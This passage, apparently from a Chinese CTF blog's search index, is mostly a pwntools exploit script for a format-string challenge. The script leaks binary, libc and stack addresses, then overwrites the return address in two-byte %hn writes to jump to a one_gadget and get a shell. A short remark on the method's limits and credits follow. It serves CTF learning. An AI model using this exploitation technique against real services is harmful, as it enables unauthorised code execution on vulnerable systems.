class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 诸葛连弩</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)    <span class="hljs-comment">#arch=&#x27;amd64&#x27;,arch=&#x27;i386&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>it = <span class="hljs-keyword">lambda</span> : p.interactive()<br>b=<span class="hljs-keyword">lambda</span> :gdb.attach(p)<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br>get_leaked_libc64_1 = <span class="hljs-keyword">lambda</span> :u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>get_leaked_libc32 = <span class="hljs-keyword">lambda</span> :u32(p.recv(<span class="hljs-number">4</span>))<br>get_leaked_libc64_2 = <span class="hljs-keyword">lambda</span> :u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))  <span class="hljs-comment"># 普通泄露 当遇到 0a乱入的时候 或者其他没有0的情况</span><br>get_canary = <span class="hljs-keyword">lambda</span>:<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)) <span class="hljs-comment"># 目前可以利用于格式化字符串的 leak</span><br><br>flag=<span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27526</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>    b()<br><br><br><span class="hljs-comment"># 过判断</span><br>payload1=<span class="hljs-string">&quot;TokameinE_is_the_best_pwner\x00&quot;</span><br>sa(<span class="hljs-string">&quot;Do you know who the best pwner is?&quot;</span>,payload1)<br><br><span class="hljs-comment"># 泄露binary</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,<span class="hljs-string">b&#x27;%9$p%29$p%8$p&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>vuln_42=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>binary_base=vuln_42-<span class="hljs-number">42</span>-elf.symbols[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br>leak(<span class="hljs-string">&quot;binary_base&quot;</span>,binary_base)<br><br><span class="hljs-comment"># 泄露libc_base</span><br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>start_240=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>libc_base=start_240-<span class="hljs-number">240</span>-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br><br><span class="hljs-comment"># 泄露栈地址</span><br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>rbp_16=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>leak(<span class="hljs-string">&quot;rbp_16&quot;</span>,rbp_16)<br><br><br><span class="hljs-comment"># one_gadget</span><br><br>one=[<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf03a4</span>,<span class="hljs-number">0xf1247</span>]<br>one_gadget=libc_base+one[<span class="hljs-number">0</span>]<br>leak(<span class="hljs-string">&quot;one_gadget&quot;</span>,one_gadget)<br><br>one_gadget_1 = one_gadget &amp; <span class="hljs-number">0xffff</span>  <span class="hljs-comment"># 后两位</span><br>one_gadget_2 = (one_gadget &gt;&gt; <span class="hljs-number">16</span>)&amp; <span class="hljs-number">0xffff</span> <span class="hljs-comment"># 往前推俩</span><br>one_gadget_3 = (one_gadget &gt;&gt; <span class="hljs-number">32</span>)&amp; <span class="hljs-number">0xffff</span> <span class="hljs-comment"># 再往前推两位</span><br>one_gadget_4 = (one_gadget &gt;&gt; <span class="hljs-number">48</span>)&amp; <span class="hljs-number">0xffff</span> <span class="hljs-comment"># 最前面两位</span><br><br>leak(<span class="hljs-string">&quot;one_gadget_1&quot;</span>,one_gadget_1)<br>leak(<span class="hljs-string">&quot;one_gadget_2&quot;</span>,one_gadget_2)<br>leak(<span class="hljs-string">&quot;one_gadget_3&quot;</span>,one_gadget_3)<br>leak(<span class="hljs-string">&quot;one_gadget_4&quot;</span>,one_gadget_4)<br><br><br><span class="hljs-comment"># ret地址</span><br>ret=rbp_16-<span class="hljs-number">8</span><br>ret_1= ret &amp; <span class="hljs-number">0xffff</span><br>ret_2= (ret + <span class="hljs-number">2</span>)&amp; <span class="hljs-number">0xffff</span><br>ret_3= (ret + <span class="hljs-number">4</span>)&amp; <span class="hljs-number">0xffff</span><br>ret_4= (ret + <span class="hljs-number">6</span>)&amp; <span class="hljs-number">0xffff</span><br>leak(<span class="hljs-string">&quot;ret_1&quot;</span>,ret_1)<br>leak(<span class="hljs-string">&quot;ret_2&quot;</span>,ret_2)<br>leak(<span class="hljs-string">&quot;ret_3&quot;</span>,ret_3)<br>leak(<span class="hljs-string">&quot;ret_4&quot;</span>,ret_4)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">第一次</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># 打第八位为rbp_16-8 也就是改成了rbp</span><br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(ret_1).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%8$hn\x00&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br><span class="hljs-comment"># 往第十个位置开始写one_gadget</span><br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(one_gadget_1).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%10$hn\x00&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">第二次</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># 打第八位为rbp_16-8 也就是改成了rbp</span><br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(ret_2).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%8$hn\x00&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br><span class="hljs-comment"># 往第十个位置开始写one_gadget</span><br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(one_gadget_2).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%10$hn\x00&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">第三次</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(ret_3).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%8$hn\x00&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br><span class="hljs-comment"># 往第十个位置开始写one_gadget</span><br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(one_gadget_3).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%10$hn\x00&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br><br><br><span class="hljs-comment"># &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># 第四次</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># payload=b&quot;%&quot; + str(ret_4).encode(&quot;utf-8&quot;) + b&quot;c%8$hn\x00&quot;</span><br><span class="hljs-comment"># sa(&quot;What do you want to say?&quot;,payload)</span><br><span class="hljs-comment"># # 往第十个位置开始写one_gadget</span><br><span class="hljs-comment"># payload=b&quot;%&quot; + str(one_gadget_4).encode(&quot;utf-8&quot;) + b&quot;c%10$hn\x00&quot;</span><br><span class="hljs-comment"># sa(&quot;What do you want to say?&quot;,payload)</span><br><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">这里环境好像有问题 机器会自己再重复打一次最后的 而且会接上这个内容 </span><br><span class="hljs-string">补\x00 让他自己再改一次 其实没啥意义</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># 五次没跑</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>  sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,<span class="hljs-string">b&#x27;Kee02p\x00&#x27;</span>)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>关于诸葛连弩的一点思考</p></blockquote><p>比较常规 也容易理解 但是如果程序 一旦出了循环 或者需要使用你改的那块地址的时候 这种方法就会崩溃 因为他需要分很多次 对一个地址 逐位进行改动</p><h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p>该文章方法学习于国资师傅</p><p><a href="https://www.freebuf.com/vuls/284210.html">博客</a></p><p><a href="https://www.bilibili.com/video/BV1mr4y1Y7fW/?p=32&amp;spm_id_from=pageDriver&amp;vd_source=123d02421ca4cdb59802724ced16b46e">四马分肥</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>结构体</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
